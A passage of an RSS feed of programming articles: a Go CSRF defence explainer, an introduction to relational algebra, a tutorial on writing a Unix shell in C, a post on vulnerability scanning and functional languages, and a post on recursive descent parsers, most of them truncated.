<p><span>For instance, a software for money transfer services could be exploited by an attacker to have a button/link to transfer money to their account by tricking the victim into clicking that button which sends the authenticated request.</span></p>

<p><span>Let’s take a look at the form below:</span></p>



<p><span>If you look at the form above, you can see that it’s used to transfer money to an account. An attacker could steal the cookies from the vuln website and when you click on </span><span>Click to send money</span><span>, it would use the cookies to send authenticated requests for you to transfer </span><span>$8100</span><span> to the accounts with </span><span>attacker@email.com</span><span> without your knowledge. Scary right?</span></p>

<p><span>This could be hosted anywhere as a clone of the application and the link sent through a phishing mail to the victim.</span></p>

<p><span>However, this could be prevented, if you have CSRF protection enabled. One way to do this, for each request, there should be a way to generate a one-time unique token from the web-server that must be provided when sending back a request once the page has loaded.&nbsp;</span></p>

<p><span>This token is usually referred to as CSRF token and it’s a random string that’s being generated on every request to a webpage and available to use in the html forms and ajax requests. This token can’t be replayed or forged.</span></p>

<p><span>Implementing this from scratch might seem stressful and time consuming, but the good thing we already have a library doing just that.</span><a href="https://github.com/gorilla/csrf"> <span>gorilla/csrf</span></a><span> middleware library is a library for adding CSRF token protection on your website.</span></p>

<p><span>To implement this on your website:</span></p>





<p><span>the template..</span></p>



<p><span>With this, your website is protected against any CSRF attacks. This will add a random string to the page which attackers can’t guess.&nbsp;</span></p>

<p><span>To implement …</span></p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.securecoding.com/fixing-common-go-vulnerabilities/">https://www.securecoding.com/fixing-common-go-vulnerabilities/</a></em></p>]]>
            </description>
            <link>https://www.securecoding.com/fixing-common-go-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24501969</guid>
            <pubDate>Thu, 17 Sep 2020 07:12:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to the Relational Algebra]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24501895">thread link</a>) | @spermwhale0
<br/>
September 16, 2020 | https://shark.armchair.mb.ca/~erwin/relalgintro_0105.html | <a href="https://web.archive.org/web/*/https://shark.armchair.mb.ca/~erwin/relalgintro_0105.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<tbody>
			<tr>
				<td></td>
				<td>
					<h2>What, why &amp; who for ?</h2>
					<p>This document essentially contains an introduction to the relational algebra that is implemented in SIRA_PRISE. Depending on your background, you may already have some or very extensive knowledge about the subject, in which case you probably do not need to read this document.</p>
					<p>If, however, your knowledge of and about the Relational Model of Data was primarily/solely obtained through the usage of SQL-based systems, and terms such as "relvar", "relation" and "tuple" sound completely unfamiliar to you, then carefully studying this document is probably a sine qua non for you to
						understand and effectively use this new system you've got in your hands.</p>
					<p>This introduction is subdivided in several parts :&nbsp;</p>
					<ul>
						<li>The first part, "<a href="#Terminology">Terminology</a>", defines the components that lay the foundation for any relational database : type, value, tuple, relation, ... &nbsp;It is rather mathematical in nature and may therefore seem to be a bit alienating ("What the hell do IT&nbsp;professionals need
							mathematics for ?"), but let me assure you that understanding&nbsp;this part really is relevant and really is needed for you to understand part two properly.
						</li>
						<li>Part two, "<a href="#Relational_Algebra">Relational Algebra</a>", offers a detailed definition and discussion of all the operators of the algebra, which is the part of the relational model that every database user employs in every single query he/she writes and/or&nbsp;executes.
						</li>
						<li>Part two introduces the operators of the algebra, making abstraction of a very particular data type called the interval type. SIRA_PRISE offers support for interval types, and the third part, "<a href="#interval_types">The RA and interval types</a>", introduces how the operators of the algebra behave
							when faced with relations that hold interval-typed attributes.
						</li>
					</ul>
					<h2>
						<a id="Terminology"></a>Terminology
					</h2>
					<p>You may have wondered, at some time, why "Relational databases" (and "Relational dbms's") are called how they are. You may have assumed that it must have had something to do with this thing called "Entity-Relationship modeling" that you may already have practiced at some point in your career. Your
						assumption was wrong. In fact, the first mention of the term "relational" in the context of data management even predates the invention of E/R modeling ... So where dóes the term come from ?</p>
					<p>Well, the term comes from something that we have presumably all been taught about in our math classes, somewhere between the age of 10 and 20, that thing being the "relation". The Relational Model of Data (RM for short) is no more or less than a mechanism to represent data in general, and which has that
						same mathematical concept of a relation as its key building brick. Before digging into the details of the algebra, it is first necessary to define a couple of terms that are frequently used when talking about the RM. That is where we will start this introduction of the relational algebra.</p>
					<ol>
						<li>
							<h3>
								<i>Set</i>
							</h3>
							<p>Lots of people collect things. Stamps, coins, rare books, art reproductions or even original art masterpieces, just name it and someone exists who collects it. You probably have spent some time in your life too, trying to build up some collection. If you have, doubtless that there have been some items
								that you have managed to collect more than once. It was problaby fun trading those "duplicates" with fellow collectors for items that you had not yet managed to collect. Well, a "collection" is a very fundamental concept in mathematics, one that is in fact needed to define what a "set" is.</p>
							<p>In mathematics, a "collection" is, loosely speaking, any possible gathering in any possible quantity of any possible things. The gathering of (chair, cloud, oak tree, chair) is a collection. Note that the collection has two chairs.</p>
							<p>Now, if a collection has the particular property that none of the items in the collection appear more than once, then we call this collection a "set". This property turns out to be a very useful and important one, and therefore sets, and set theory, are very important in mathematics. So important in fact
								that relational database technology could and would not even have been invented without them. Important enough also, to be repeated in bold :</p>
							<p>
								<b>A set is a collection that does not contain duplicates.<br> Something that does contain duplicates, is not a set.
								</b>
							</p>
						</li>
						<li>
							<h3>
								<i>Type/Value</i>
							</h3>
							<ol>
								<li>
									<h4>
										<i>Definition</i>
									</h4>
									<p>So {A,1,oak tree,patent} is a set. {A,patent,A} is not. Now, in the context of data management problems, which is what we're interested in, sets such as those&nbsp;are of course not very useful. In the context of data management, sets are mostly useful only if the items they contain are in some way
										"alike". In that context, we usually deal with sets that contain only numbers, only dates, or some such. Useful sets in data management are sets such as {Monday, Tuesday, Wednesday, Thursday, Friday} and {true, false}. Without attempting a formal and precise definition of the term, we can (and do) say that a
										Type is such a "useful" set. And a Value is one of the items contained in a Type. Which brings us to :</p>
									<p>
										<b>A Type is a set of Values.</b>
									</p>
								</li>
								<li>
									<h4>
										<i>Additional remarks</i>
									</h4>
									<p>In data management, we will often need to speak about, or refer to, such Types. For that reason, it is customary that all the Types we use are assigned a name. The type {Monday, Tuesday, Wednesday, Thursday, Friday}, e.g. could be assigned the name 'Weekdays'. The type {true, false}, e.g. could be
										assigned the name 'Boolean'. Such that we can say :</p>
									<p>
										<b>A Type is a named set of Values.</b>
									</p>
									<p>You might wonder at the mutual dependency in the definition here. A type is a set of values, and a value is an item in a type. In the end, that doesn't really define much, does it ? Shouldn't we have some other definition of what a 'Value' is ? Well, for the purpose of this introduction, that isn't
										really necessary. The reason for this is that the RM (and the algebra) can work with just any set of types. The RM does not "fall apart" if the set of integers is not defined as a type, nor does the algebra. (It would be difficult to build a useful database without that type, but that's another issue.) And
										the most important consequence is that this observation is equally valid "the other way round" : the RM does not stop you from defining whatever type you like. The RM gives you no answer to the question when or why something is a value, and when or why not. As far as the RM is concerned, a value is whatever
										you want it to be, and a type is whatever set you define it to be. It only depends on whether you have a useful purpose for the type or not. A set such as {Em, C, G, ...} might look pretty insane and useless to most readers, but a guitar player would certainly have some good uses for a type holding the guitar
										chords as values ...</p>
								</li>
							</ol>
						</li>
						<li>
							<h3>
								<i>Cartesian product</i>
							</h3>
							<ol>
								<li>
									<h4>
										<i>Definition</i>
									</h4>
									<p>Looking at our example types Weekday and Boolean, it's not difficult to see how one can "pick a value from the first type, then pick a value from the second one, then arrange those two picked values to form a pair.". One example of such a pair would be (Monday, false). There are 10 such pairs possible,
										and those 10 pairs can be gathered into a set. Such a set turns out to be a very important concept in mathematics too, so important in fact that the concept of such a set is given a name : the "Cartesian Product".</p>
									<p>
										<b>The Cartesian product of two sets is the set of all possible pairs formed from the items in those two sets.</b>
									</p>
								</li>
								<li>
									<h4>
										<i>Remarks</i>
									</h4>
									<p>The term "Cartesian product" is not often encountered in the world of RM. The reason for&nbsp;this will become clear in the next few sections. Nevertheless it is worthwhile to reiterate in a more informal manner : A Cartesian product is a set, and the things that we find in that set are "pairs of other
										things", and those "other things" are precisely the things that are part of one of the sets that were used to form the Cartesian product.</p>
								</li>
							</ol>
						</li>
						<li>
							<h3>
								<i>Relation (Traditional mathematics version)</i>
							</h3>
							<ol>
								<li>
									<h4>
										<i>Definition</i>
									</h4>
									<p>Traditional set theory then goes on to define the concept of a "Relation" :</p>
									<p>A Relation is a subset of a Cartesian product of two sets.</p>
								</li>
								<li>
									<h4>
										<i>Remarks</i>
									</h4>
								</li>
								<p>Examples of such relations are then : {(Monday, false),(Monday, true)}, {}, {(Tuesday, false),(Thursday, true)}, ...</p>
								<p>Once again it is worthwhile to reiterate in a more informal manner : A Relation is a set, and the things that we find in that set are "pairs of other things", and those "other things" are precisely the things that are part of one of the sets that were used to form the Cartesian product of which the
									Relation happens to be a subset.</p>
							</ol>
						</li>
						<li>
							<h3>
								<i>Generalized product</i>
							</h3>
							<ol>
								<li>
									<h4>
										<i>Definition</i>
									</h4>
									<p>Following this definition, a relation can be (and is indeed) defined as being a set of pairs. For the context of data management problems, this definition isn't so useful, however. Indeed, when recording data about our customers, sales, ..., we usually record a lot more things than just two. So for the
										specific purpose of data management, the concept of a relation had to be "adapted" somewhat ("generalised" is the correct word, actually) to cater for that problem. It is not difficult to see how this can be done : instead of "picking values from two types and arrange those", one can also "pick one value from
										each of any number of types, and arrange those". The set that is formed by …</p></li></ol></li></ol></td></tr></tbody></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shark.armchair.mb.ca/~erwin/relalgintro_0105.html">https://shark.armchair.mb.ca/~erwin/relalgintro_0105.html</a></em></p>]]>
            </description>
            <link>https://shark.armchair.mb.ca/~erwin/relalgintro_0105.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24501895</guid>
            <pubDate>Thu, 17 Sep 2020 06:56:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write a Shell in C (2015)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24501806">thread link</a>) | @xanthine
<br/>
September 16, 2020 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan • 16 January 2015</em></p><p>It’s easy to view yourself as “not a <em>real</em> programmer.”  There are programs out
there that everyone uses, and it’s easy to put their developers on a pedestal.
Although developing large software projects isn’t easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you’re
a student in such a class, you shouldn’t copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let’s look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
configuration files.  These change aspects of the shell’s behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we’re
going to use them for the basis for our shell.  Our shell will be so simple that
there won’t be any configuration files, and there won’t be any shutdown command.
So, we’ll just call the looping function and then terminate.  But in terms of
architecture, it’s important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We’ll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we’ve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I’ll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let’s walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we’re using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don’t know ahead of time how much text a user will enter
into their shell.  You can’t simply allocate a block and hope they don’t exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we’ll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn’t noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that’s
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it’s the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that’s really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn’t know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I’m leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You’d be robbing yourself of a
learning opportunity if you didn’t!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we’ve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I’m going to make a glaring simplification here,
and say that we won’t allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is “tokenize” the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it’s because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we’re doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we’re really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what’s going on with processes and how they start.  That’s why I’m going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn’t count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren’t Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24501806</guid>
            <pubDate>Thu, 17 Sep 2020 06:35:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Infosec Apocalypse]]>
            </title>
            <description>
<![CDATA[
Score 155 | Comments 99 (<a href="https://news.ycombinator.com/item?id=24501803">thread link</a>) | @chillax
<br/>
September 16, 2020 | https://blog.rickasaurus.com/2020/08/31/The-Infosec-Apocalypse.html | <a href="https://web.archive.org/web/*/https://blog.rickasaurus.com/2020/08/31/The-Infosec-Apocalypse.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The rise of tooling for vulnerability detection combined with pressure driven by Vendor Due Diligence is causing a massive enterprise freezeout for non-mainstream technologies across the board. Of particular concern is the impact this will have on the adoption of functional programming in enterprise and small business B2B development.</p>

<p>I see now that the last 10 years were “easy mode” for the growth of new programming tools and infrastructure, with many new breakthrough technologies seeing rapid adoption. Languages like Node, Go and to some degree Scala saw breakaway success, not to mention all of the new cloud tech, NoSQL tech, containerization and data processing platforms along with their custom query DSLs. Other languages like Haskell saw success in small companies and skunkworks style teams solving very difficult problems.</p>

<h3 id="the-rise-of-vulnerability-scanning">The Rise of Vulnerability Scanning</h3>

<p>Just this past year I’ve come to see we’re in the middle of a massive change across the industry. There are new forces at play which will calcify current software stacks and make it extremely hard for existing or new entrants to see similar success without a massive coordinated push backed by big enterprise companies. This force is the rise of InfoSec and vulnerability detection tooling.</p>

<p>Tools like <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">Blackduck, WhiteSource, Checkmarx, Veracode</a> are exploding in popularity, there are too many to list and many variations on the same theme. In the wake of so many data leaks and hacking events enterprises no longer trust their developers and SREs to take care of security, and so protocols are being implemented top down. This isn’t just on the code scanning side, there is a similar set of things going on with network scanning as well which impacts programming languages less, but similarly will calcify server stacks.</p>

<p>These tools are quickly making their way into SOC2 and SDLC policies across industry, and if your language or new infrastructure tool isn’t supported by them there’s little chance you will get the previously already tenuous approval to use them. This sets the already high bar for adoption much higher. As you might expect, vendors will only implement support for languages that meet some threshold for profitability of their tools. Not only do you need to build a modern set of tools for your language to compete, now you also need support from external vendors.</p>

<h3 id="vendor-due-diligence">Vendor Due Diligence</h3>

<p>Maybe we just cede this territory to enterprise tools with big backers like Microsoft and Oracle, we never more than a few small inroads anyway. The use of these tools is arguably a good thing overall for software security. Unfortunately, the problem cannot be sidestepped so easily, and I’m afraid this is where things look very bleak. The biggest new trend is in enforcement of these tools through Vendor Due Diligence.</p>

<p>You may not be familiar with Vendor Due Diligence if you aren’t in a manager role. The basic idea is your customer will send you a long list of technical questions about your product which you must fill out to their satisfaction before they buy your product or service. In the B2B space where I work these lists are nothing new, but have been getting longer and longer over the last 10 years, now often numbering in the hundreds of questions.</p>

<p>Most recently I’ve seen more and more invasive questions being asked, some even going into how teams are organized, but important to this article is that across the board they now all ask about vulnerability scanning and now often request specific outputs for well-known vulnerability scanning tools. The implication being that if you’re not scanning with these tools they won’t buy your software, and the list of supported languages is small.</p>

<p>Any experienced technology manager sees the natural tradeoff here. When it comes down to making money versus using cool tech, cool tech will lose every time. You’re just burning money if you’re building cool things with cool tech if you know no one will buy it.</p>

<h3 id="so-what-now">So What Now?</h3>

<p>Potentially we will see a resurgence of “compile-to” functional programming with mainstream language targets to sidestep the issue. I suppose though that the extra build complexity and problems debugging will prevent this from ever being mainstream, not to mention that the vulnerability tools look for specific patterns and likely won’t behave well on generated code.</p>

<p>There is some hope in the form of projects like SonarCube which enables users to come together and <a href="https://github.com/SonarSource/sonar-custom-plugin-example">build custom plugins</a>. Will functional programming communities come together to build and maintain such boring tech? I somewhat doubt it. This kind of work is not what most programmers would choose to do in their off time. Similarly, vulnerability detection is unlikely to be a good target to be advanced a little at a time with academic papers. It would take true functional programming fanatics to build companies or tools dedicated to the cause. If you are interested in helping out, pay attention to the <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> as this list drives focus for many infosec teams.</p>

<p>Where does this leave us? If our communities do nothing then smaller B2B software operations focused mom and pop shops or consumer focused web applications likely won’t see any impact unless static analysis makes it into data protection law. Beyond these use cases FP will be relegated to tiny boxes on the back end where vulnerabilities are much less of a concern and the mathematical skills of functional programmers can bring extreme amounts of value.</p>

<p>I know there are many deeper facets I didn’t cover here, if you want to continue the discussion <a href="https://twitter.com/rickasaurus/status/1300487826782420995">join the thread on twitter</a>.</p>


  </div></div>]]>
            </description>
            <link>https://blog.rickasaurus.com/2020/08/31/The-Infosec-Apocalypse.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24501803</guid>
            <pubDate>Thu, 17 Sep 2020 06:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I write recursive descent parsers (despite their issues)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24500860">thread link</a>) | @panic
<br/>
September 16, 2020 | https://utcc.utoronto.ca/~cks/space/blog/programming/WhyRDParsersForMe | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/programming/WhyRDParsersForMe">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Why I write recursive descent parsers (despite their issues)</h2>

	<p><small>September 16, 2020</small></p>
</div><div><p>Today I read Laurence Tratt's <a href="https://tratt.net/laurie/blog/entries/which_parsing_approach.html">Which Parsing Approach?</a> (<a href="https://lobste.rs/s/9pcqys/which_parsing_approach">via</a>), which has a
decent overview of how parsing computer languages (including little
domain specific languages) is not quite the well solved problem
we'd like it to be. As part of the article, Tratt discusses how
<a href="https://en.wikipedia.org/wiki/Recursive_descent_parser">recursive descent parsers</a> have a
number of issues in practice and recommends using other things,
such as a LR parser generator.</p>

<p>I have a long standing interest in parsing, I'm reasonably well
aware of the annoyances of recursive descent parsers (although some
of the issues Tratt raised hadn't occurred to me before now), and
I've been exposed to parser generators like Yacc. Despite that, my
normal approach to parsing any new little language for real is to
write a recursive descent parser in whatever language I'm using,
and Tratt's article is not going to change that. My choice here is
for entirely pragmatic reasons, because to me recursive descent
